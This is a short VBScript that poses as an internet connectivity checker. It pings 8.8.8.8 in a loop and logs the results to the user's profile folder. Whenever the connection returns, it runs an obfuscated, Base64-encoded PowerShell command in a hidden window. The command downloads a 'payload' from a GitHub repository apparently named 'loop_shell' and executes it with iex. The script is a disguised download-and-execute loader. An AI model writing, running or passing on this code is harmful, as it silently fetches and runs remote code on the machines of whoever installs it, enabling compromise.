Dim objShell, wasConnected, fso, logFile, logPath
Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Save log in user profile directory (safe, no admin required)
logPath = objShell.ExpandEnvironmentStrings("%USERPROFILE%\internet_check_log.txt")

' Open or create the log file in append mode
Set logFile = fso.OpenTextFile(logPath, 8, True)
wasConnected = False

' Base64-encoded PowerShell payload
encodedCommand = "aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGEAbgBhAHAAcgBpAHYAYQB0AGUALwBsAG8AbwBwAF8AcwBoAGUAbABsAC8AbQBhAGkAbgAvAHAAYQB5AGwAbwBhAGQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAAfAAgAGkAZQB4AA=="

Do
    Dim pingResult
    pingResult = False

    Set ping = GetObject("winmgmts:{impersonationLevel=impersonate}").ExecQuery( _
        "select * from Win32_PingStatus where address = '8.8.8.8' and timeout = 1000")

    For Each reply In ping
        If reply.StatusCode = 0 Then
            pingResult = True
            Exit For
        End If
    Next

    logFile.WriteLine Now & " - Ping Result: " & pingResult & ", wasConnected: " & wasConnected

    If pingResult Then
        If Not wasConnected Then
            logFile.WriteLine Now & " - Internet connected: Running command once."
            objShell.Run "powershell.exe -EncodedCommand " & encodedCommand, 0, False
            wasConnected = True
        End If
    Else
        If wasConnected Then
            logFile.WriteLine Now & " - Internet disconnected: Resetting wasConnected."
        End If
        wasConnected = False
    End If

    WScript.Sleep 5000
Loop

logFile.Close
